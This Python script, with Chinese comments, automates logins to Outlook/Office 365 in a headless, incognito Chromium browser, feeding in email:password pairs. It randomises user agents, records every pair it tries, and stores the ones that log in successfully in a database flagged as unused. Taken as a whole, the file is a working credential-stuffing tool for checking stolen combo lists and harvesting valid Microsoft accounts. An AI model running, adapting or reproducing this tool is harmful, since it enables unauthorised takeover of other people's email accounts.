import os
import time
import pytz
from datetime import datetime

from DrissionPage import ChromiumOptions, ChromiumPage
from fake_useragent import UserAgent
from sqlalchemy import false

from db import LoginValid, SessionLocal

co = ChromiumOptions(read_file=False)
co.auto_port(True)
co.no_imgs(True).mute(True)
co.incognito(True)
co.headless(True)
co.set_argument('--no-sandbox')
co.set_argument('--disable-gpu')
co.set_argument("--disable-extensions")
co.set_argument('--window-size', '1920,1080')


# 主要逻辑
def login_check(email, passwd):
    with open("result/check history.txt", "a+", encoding="UTF-8") as writers:
        writers.write(f"{email}:{passwd}" + os.linesep)
    email_pass = f"{email}:{passwd}"
    page = None
    try:
        new_line = LoginValid(email_pass=email_pass)
        db = SessionLocal()
        email_pass_exist = db.query(LoginValid).filter(LoginValid.email_pass == new_line.email_pass).first()
        db.close()
        if email_pass_exist:
            print("Email_Pass already exist!")
        else:
            ua = UserAgent()
            co.set_user_agent(ua.random)
            email = email.strip("\n")
            passwd = passwd.strip("\n")
            page = ChromiumPage(co)
            page.get("https://outlook.office365.com/mail/", retry=1, timeout=20)
            time.sleep(5)
            # 获取登录input，然后输入账号
            login_input = page.ele("@type=email")
            login_input.input(f"{email}\n")
            time.sleep(5)
            if page.ele("@type=password"):
                # 获取输入密码input，然后输入密码
                passwd_input = page.ele("@type=password")
                passwd_input.input(f"{passwd}\n")
            else:
                # 如果需要点击组织还是个人账户，则点击
                if page.ele("#aadTile", timeout=5):
                    double_click_btn = page.ele("#aadTile", timeout=7)
                    double_click_btn.click(by_js=True, timeout=2)
                if page.ele("#aadTile", timeout=5):
                    double_click_btn = page.ele("#aadTile", timeout=7)
                    double_click_btn.click(by_js=True, timeout=2)
                # 获取输入密码input，然后输入密码
                passwd_input = page.ele("@type=password")
                passwd_input.input(f"{passwd}\n")
            time.sleep(15)
            # 如果页面存在 不再显示此消息，则表示登录成功
            if page.ele("@name=DontShowAgain", timeout=10):
                # 获取是否保持登录中的否按钮，然后点击
                page.quit()
                insert_into_db(email_pass)
                return True
            else:
                # 不存在 不再显示此消息
                # 可能是直接进入邮箱了，也可能密码错误等其它情况
                # 获取当前网页url
                page_url = page.url
                if "outlook.office365.com" in page_url:
                    page.quit()
                    insert_into_db(email_pass)
                    return True
                else:
                    page.quit()
                    return False
    except Exception as e:
        if page is not None:
            page.quit()
        with open("result/error line.txt", "a+", encoding="UTF-8") as writers:
            writers.write(f"{email}:{passwd}" + os.linesep)
        with open("result/error logs.txt", "a+", encoding="UTF-8") as writers:
            writers.write(f"Error: {e}" + os.linesep)


def insert_into_db(email_pass):
    db = SessionLocal()
    beijing_tz = pytz.timezone('Asia/Shanghai')
    new_email_pass = LoginValid(email_pass=email_pass, jet_used=false(), check_date=datetime.now(beijing_tz))
    try:
        db.add(new_email_pass)
        db.commit()
        db.refresh(new_email_pass)
    except Exception as e:
        db.rollback()
        raise
    finally:
        db.close()
